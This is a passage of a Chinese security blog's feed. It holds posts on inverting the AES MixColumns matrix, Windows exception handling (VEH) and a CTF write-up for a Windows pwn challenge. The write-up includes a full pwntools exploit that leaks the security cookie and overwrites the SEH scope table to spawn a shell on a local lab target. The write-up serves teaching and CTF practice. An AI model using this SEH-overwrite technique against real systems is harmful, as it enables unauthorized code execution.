class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gf28_add</span>(<span class="params">a:<span class="built_in">int</span>,b:<span class="built_in">int</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xff</span> &amp; (a ^ b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gf28_mul</span>(<span class="params">a:<span class="built_in">int</span>,b:<span class="built_in">int</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        <span class="keyword">if</span> b&amp;<span class="number">1</span>:</span><br><span class="line">            result = a ^ result</span><br><span class="line">        a&lt;&lt;=<span class="number">1</span></span><br><span class="line">        b&gt;&gt;=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#没有大小之说,只要长度相同就能进行运算.(或者说大小就算用长度比较.)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_mul</span>(<span class="params">a:<span class="built_in">int</span>, b:<span class="built_in">int</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    p = gf28_mul(a,b)</span><br><span class="line">    <span class="comment">##求p mod 0b100011011</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(i * <span class="number">0b100011011</span>)) &gt; <span class="built_in">len</span>(<span class="built_in">bin</span>(p)):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(i * <span class="number">0b100011011</span>)) &lt; <span class="built_in">len</span>(<span class="built_in">bin</span>(p)):</span><br><span class="line">            i&lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">bin</span>(i * <span class="number">0b100011011</span>)) == <span class="built_in">len</span>(<span class="built_in">bin</span>(p)))</span><br><span class="line">        p^= (i * <span class="number">0b100011011</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_reverse</span>(<span class="params">a:<span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> mod_mul(i,a) == <span class="number">0x1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span>(<span class="literal">False</span>)</span><br><span class="line"><span class="comment">##x 8 + x 4 + x 3 + x + 1</span></span><br><span class="line"><span class="comment">## 0b100011011</span></span><br><span class="line">_<span class="built_in">map</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_mul</span>(<span class="params">m1,m2,size</span>):</span><br><span class="line">    result = [[<span class="literal">None</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(size)] <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(size)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">            result[y][x] = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">                result[y][x] =gf28_add( result[y][x] ,mod_mul(m1[y][t] , m2[t][x]))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确实是存在逆的 ..但是为什么呢??</span></span><br><span class="line"><span class="comment"># for i in range(1,256):</span></span><br><span class="line"><span class="comment">#     key = get_reverse(i)</span></span><br><span class="line"><span class="comment">#     print(key)</span></span><br><span class="line"><span class="comment">#     if _map.get(key) != None:</span></span><br><span class="line"><span class="comment">#        print(&quot;Error&quot;)</span></span><br><span class="line"><span class="comment">#        exit(0)</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         _map[key] = True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">矩阵:</span></span><br><span class="line"><span class="string">2 3 1 1</span></span><br><span class="line"><span class="string">1 2 3 1</span></span><br><span class="line"><span class="string">1 1 2 3</span></span><br><span class="line"><span class="string">3 1 1 2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">A = [</span><br><span class="line">    [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>],</span><br><span class="line">    [<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">]</span><br><span class="line"><span class="comment"># Ax = E,将A 化为行阶梯矩阵</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="comment">#求出主元的逆.</span></span><br><span class="line">    r = get_reverse(A[i][i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span> - i):</span><br><span class="line">        <span class="comment"># a x = b,求出x</span></span><br><span class="line">        x = mod_mul(r , A[i + <span class="number">1</span> + j][i])</span><br><span class="line">        <span class="comment">#消去一个元之后新的一行</span></span><br><span class="line">        new_l = A[i + <span class="number">1</span> + j]</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            new_l[t] = gf28_add(mod_mul(x,A[i][t]),A[i+<span class="number">1</span>+j][t])</span><br><span class="line"></span><br><span class="line"><span class="comment">##回代</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    r = get_reverse(A[<span class="number">3</span> - i][<span class="number">3</span> - i])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span> - i):</span><br><span class="line">        <span class="comment"># ax = b,求出x = a^-1 * b</span></span><br><span class="line">        x = mod_mul(r,A[<span class="number">3</span> - i - <span class="number">1</span> - j][<span class="number">3</span> - i])</span><br><span class="line">        new_l = A[<span class="number">3</span> - i - <span class="number">1</span> - j]</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            new_l[t] = gf28_add(mod_mul(x,A[<span class="number">3</span> - i][t]),A[<span class="number">3</span> - i - <span class="number">1</span>-j][t])</span><br><span class="line"></span><br><span class="line"><span class="comment">## 化为1..</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    r = get_reverse(A[i][i])</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        A[i][t] = mod_mul(r,A[i][t])</span><br><span class="line"></span><br><span class="line"><span class="comment">#################################</span></span><br></pre></td></tr></table></figure><p>瞎JB求出来了，是下面的这个矩阵:</p><p><img src="https://h4ckf0rfun.github.io/2022/10/09/AES%E5%88%97%E6%B7%B7%E5%90%88%E7%9F%A9%E9%98%B5%E6%B1%82%E9%80%86/Untitled.png" alt="Untitled"></p><p>但是还有很多不懂的地方，看来得好好学习离散数学的知识了</p><p>不懂的地方:</p><ol><li>为什么有逆?</li><li>为什么要写成多项式的形式</li></ol><p>等之后学会了再把好好写一篇。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AES列混合-矩阵求逆&quot;&gt;&lt;a href=&quot;#AES列混合-矩阵求逆&quot; class=&quot;headerlink&quot; title=&quot;AES列混合 矩阵求逆&quot;&gt;&lt;/a&gt;AES列混合 矩阵求逆&lt;/h1&gt;&lt;p&gt;还是没太明白具体原理，瞎JB搞了下但是算出来了&lt;/p&gt;
&lt;p&gt;GF(</summary>
      
    
    
    
    <category term="algorithm" scheme="https://h4ckf0rfun.github.io/categories/algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>windows 异常(0) - 总览</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/07/windows%E5%BC%82%E5%B8%B8-0/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/07/windows%E5%BC%82%E5%B8%B8-0/</id>
    <published>2022-10-07T15:35:22.000Z</published>
    <updated>2022-10-07T15:36:48.632Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://h4ckf0rfun.github.io/2022/10/07/windows%E5%BC%82%E5%B8%B8-0/%25E6%2597%25A0%25E6%25A0%2587%25E9%25A2%2598.png" alt="无标题.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.github.io/2022/10/07/windows%E5%BC%82%E5%B8%B8-0/%25E6%2597%25A0%25E6%25A0%2587%25E9%25A2%2598.png&quot; alt=&quot;无标题</summary>
      
    
    
    
    <category term="逆向" scheme="https://h4ckf0rfun.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>c程序运行流程</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/07/c%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/07/c%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B/</id>
    <published>2022-10-07T11:44:16.000Z</published>
    <updated>2022-10-07T11:45:52.713Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://h4ckf0rfun.github.io/2022/10/07/c%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B/%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B.png" alt="Untitled"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.github.io/2022/10/07/c%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B/%E8%BF%90%E8%A1%8C%E6%B5%81%E7%</summary>
      
    
    
    
    <category term="C语言" scheme="https://h4ckf0rfun.github.io/categories/C%E8%AF%AD%E8%A8%80/"/>
    
    
  </entry>
  
  <entry>
    <title>windows 异常(1) - VEH</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/06/windows%E5%BC%82%E5%B8%B8-1/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/06/windows%E5%BC%82%E5%B8%B8-1/</id>
    <published>2022-10-05T16:46:12.000Z</published>
    <updated>2022-10-05T16:51:36.850Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VEH-Vector-Exception-Handler"><a href="#VEH-Vector-Exception-Handler" class="headerlink" title="VEH: Vector Exception Handler"></a>VEH: Vector Exception Handler</h1><p>当异常产生时，从0环返回三环后先进入 KiUserExceptionDispatcher函数</p><p><img src="https://h4ckf0rfun.github.io/2022/10/06/windows%E5%BC%82%E5%B8%B8-1/Untitled.png" alt="Untitled"></p><p>之后进入RtlDispatchException，</p><p><img src="https://h4ckf0rfun.github.io/2022/10/06/windows%E5%BC%82%E5%B8%B8-1/Untitled%201.png" alt="Untitled"></p><ol><li>先在vector exception handler list 中搜索处理程序.</li><li>如果在 vector exception handler list 没有对应的处理程序，那么从 fs:[0] 开始遍历ExceptionList来搜索对应的异常处理程序</li></ol><p>当异常被异常处理程序处理之后，再次调用ZwContinue进入0环，等下一次恢复到3环时，从修正的eip处开始执行。</p><h1 id="安装VEH"><a href="#安装VEH" class="headerlink" title="安装VEH"></a>安装VEH</h1><p><strong><strong>AddVectoredExceptionHandler</strong></strong></p><h2 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a><strong>Syntax</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PVOID AddVectoredExceptionHandler(</span><br><span class="line">  ULONG                       First,</span><br><span class="line">  PVECTORED_EXCEPTION_HANDLER Handler</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Parameters"><a href="#Parameters" class="headerlink" title="Parameters"></a><strong>Parameters</strong></h2><p><code>First</code></p><p>The order in which the handler should be called. If the parameter is nonzero, the handler is the first handler to be called. If the parameter is zero, the handler is the last handler to be called.</p><p><code>Handler</code></p><p>A pointer to the handler to be called. For more information, see <a href="https://learn.microsoft.com/en-us/windows/desktop/api/winnt/nc-winnt-pvectored_exception_handler">VectoredHandler</a>.</p><h2 id="Return-value"><a href="#Return-value" class="headerlink" title="Return value"></a><strong>Return value</strong></h2><p>If the function succeeds, the return value is a handle to the exception handler.</p><p>If the function fails, the return value is <strong>NULL</strong>.</p><h2 id="Example"><a href="#Example" class="headerlink" title="Example:"></a><strong>Example:</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">LONG __stdcall <span class="title function_">vectoredExceptionHandler</span><span class="params">(</span></span><br><span class="line"><span class="params"> _EXCEPTION_POINTERS *ExceptionInfo</span></span><br><span class="line"><span class="params">)</span>&#123;</span><br><span class="line"><span class="comment">//EXCEPTION_XXXXXX</span></span><br><span class="line"><span class="keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;Div by zero&quot;</span>, <span class="string">L&quot;Error&quot;</span>, MB_OK);</span><br><span class="line">ExceptionInfo-&gt;ContextRecord-&gt;Eip += <span class="number">2</span>;</span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<span class="comment">//继续执行代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;<span class="comment">//不是我们感兴趣的Exception Code,让它继续沿着链表去寻找处理程序</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == AddVectoredExceptionHandler(<span class="number">0</span>, vectoredExceptionHandler))&#123;</span><br><span class="line">perror(<span class="string">&quot;Add Vector Exception Handler Failed!&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">__asm&#123;</span><br><span class="line">xor eax, eax;</span><br><span class="line">div eax;              <span class="comment">//触发异常.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VEH-Vector-Exception-Handler&quot;&gt;&lt;a href=&quot;#VEH-Vector-Exception-Handler&quot; class=&quot;headerlink&quot; title=&quot;VEH: Vector Exception Handler&quot;&gt;&lt;/a&gt;V</summary>
      
    
    
    
    <category term="逆向" scheme="https://h4ckf0rfun.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows_第五空间2019决赛pwn9</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/</id>
    <published>2022-10-05T13:08:38.000Z</published>
    <updated>2022-10-05T13:09:50.777Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows-第五空间2019-决赛-PWN9"><a href="#Windows-第五空间2019-决赛-PWN9" class="headerlink" title="[Windows][第五空间2019 决赛]PWN9"></a>[Windows][第五空间2019 决赛]PWN9</h1><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled.png" alt="Untitled"></p><p>程序给出了main和stack地址，而且有栈溢出的漏洞。并且有任意地址读。</p><p>由于程序在最好直接调用exit(0)退出程序，所有利用栈溢出覆盖返回地址是不太可能的。</p><p>切到汇编可以看到存在try_except结构，想起了windows SEH，在栈内会保存一个异常处理函数的地址，猜测与这个有关</p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%201.png" alt="Untitled"></p><p>这是函数一开始在栈内加入的一个Exception节点</p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%202.png" alt="Untitled"></p><p>可以看出大概的定义是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">DWORD next;</span><br><span class="line">DWORD __exception_handler;</span><br><span class="line">DWORD _off_struc ^ __security_cookie;   <span class="comment">//这里进行了异或加密处理</span></span><br><span class="line">DWORD __try_level;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这部分代码是构造一个节点并加入到ExceptionList的头部 （头插法,fs:[0] 保存的是ExceptionListHead）</p><p>当程序出现异常时，会从ExceptionListHead寻找异常处理程序去执行,详细的介绍等参考window SEH</p><p>看看这个结构体里面是啥</p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%203.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%204.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%205.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%206.png" alt="Untitled"></p><p>一个是__except filter ,一个是__except 处理代码 (如果是嵌套try的话，这里会有多组 filter+except )</p><p>那么就能伪造一个结构体，把__except处理代码的地址改为我们想要执行的代码，而且这道题目中是有 system(”cmd”)的，只要跳到这里就行:</p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%207.png" alt="Untitled"></p><p>伪造好这个结构体之后，把栈内那个节点的第三个成员替换为 这个结构体的地址^__security_cookie </p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10086</span>)</span><br><span class="line"></span><br><span class="line">def int32(val):</span><br><span class="line">    val = val &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> val &amp; <span class="number">0x80000000</span>:</span><br><span class="line">        val =  -(<span class="number">0x100000000</span> - val)</span><br><span class="line">        print(val)</span><br><span class="line">    <span class="keyword">else</span>:           <span class="meta">#unsigned </span></span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">def leak(addr):</span><br><span class="line">    p.sendlineafter(b<span class="number">&#x27;</span>Answer<span class="number">&#x27;</span>,b<span class="number">&#x27;</span>yes<span class="number">&#x27;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="number">&#x27;</span>know<span class="number">&#x27;</span>,str(int32(addr)).encode())</span><br><span class="line">    p.recvuntil(b<span class="number">&#x27;</span>value is <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    d = p.recvline()[:-1]</span></span><br><span class="line"><span class="string">    return int(d,16)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.recvuntil(b&#x27;</span><span class="built_in">stack</span> address = <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">stack_addr = int(p.recvline()[:-1],16)</span></span><br><span class="line"><span class="string">p.recvuntil(b&#x27;</span>main address = <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">main_addr  = int(p.recvline()[:-1],16)</span></span><br><span class="line"><span class="string">base = main_addr - (0x000510B0 - 0x00051000 )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">success(&#x27;</span>stack_addr:<span class="string">&#x27; + hex(stack_addr))</span></span><br><span class="line"><span class="string">success(&#x27;</span>main_addr:<span class="string">&#x27; + hex(main_addr))</span></span><br><span class="line"><span class="string">success(&#x27;</span>base_addr:<span class="string">&#x27; + hex(base))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">backdoor = base + 0x05138D - 0x51000 </span></span><br><span class="line"><span class="string">filter_func = base + 0x051348 - 0x51000</span></span><br><span class="line"><span class="string">#栈溢出伪造SEH结构体</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fake_struc_addr = stack_addr + 128 + 4 + 0x18           ##0x53688 ##</span></span><br><span class="line"><span class="string">struc = b&#x27;</span>&#x27;</span><br><span class="line">struc += p32(<span class="number">0xFFFFFFE4</span>)</span><br><span class="line">struc += p32(<span class="number">0</span>)</span><br><span class="line">struc += p32(<span class="number">0x0FFFFFF20</span>)</span><br><span class="line">struc += p32(<span class="number">0</span>)</span><br><span class="line">struc += p32(filter_func)</span><br><span class="line">struc += p32(backdoor)</span><br><span class="line"></span><br><span class="line">#<span class="meta">#leak stack data,不知道改了会出啥问题</span></span><br><span class="line">##先laek 出来再覆盖</span><br><span class="line">d = b<span class="number">&#x27;&#x27;</span></span><br><span class="line">##</span><br><span class="line">__security_cookie = leak(base + <span class="number">0x0054004</span> - <span class="number">0x51000</span>)</span><br><span class="line">success(<span class="string">&#x27;__security_cookie:&#x27;</span> + hex(__security_cookie))</span><br><span class="line"></span><br><span class="line">payload = b<span class="number">&#x27;</span>\xff<span class="number">&#x27;</span> * <span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">5</span>:</span><br><span class="line">        payload += p32(fake_struc_addr ^ __security_cookie)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        val = leak(stack_addr + <span class="number">128</span> + <span class="number">4</span> * i)</span><br><span class="line">        payload += p32(val)</span><br><span class="line"></span><br><span class="line">payload += struc</span><br><span class="line">assert(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span> not in payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="number">&#x27;</span>Answer<span class="number">&#x27;</span>,b<span class="number">&#x27;</span>no<span class="number">&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="meta">#getshell</span></span><br><span class="line">p.sendlineafter(b<span class="number">&#x27;</span>Answer<span class="number">&#x27;</span>,b<span class="number">&#x27;</span>yes<span class="number">&#x27;</span>)</span><br><span class="line">p.sendlineafter(b<span class="number">&#x27;</span>know<span class="number">&#x27;</span>,b<span class="number">&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="为什么不直接修改-exception-handler为异常处理程序"><a href="#为什么不直接修改-exception-handler为异常处理程序" class="headerlink" title="为什么不直接修改__exception_handler为异常处理程序?"></a>为什么不直接修改__exception_handler为异常处理程序?</h3><p>会检查handler的有效性，不能随便瞎写</p><p><img src="https://h4ckf0rfun.github.io/2022/10/05/Windows-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn9/Untitled%208.png" alt="Untitled"></p><p>我直接修改了__exception_handler之后，这里直接失败，(至于是咋检查的，还没仔细研究…..)</p><h3 id="题目环境搭建"><a href="#题目环境搭建" class="headerlink" title="题目环境搭建"></a>题目环境搭建</h3><p>不知道咋搞，简单写了一个程序重定向输入输出:</p><p>(socket函数创建的socket无法通过ReadFile和WriteFile直接读写数据，WSASocket的可以，这里试了一下WSAAccept也是可以的，所以可以直接修改pwn.exe的输出输出为socket.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 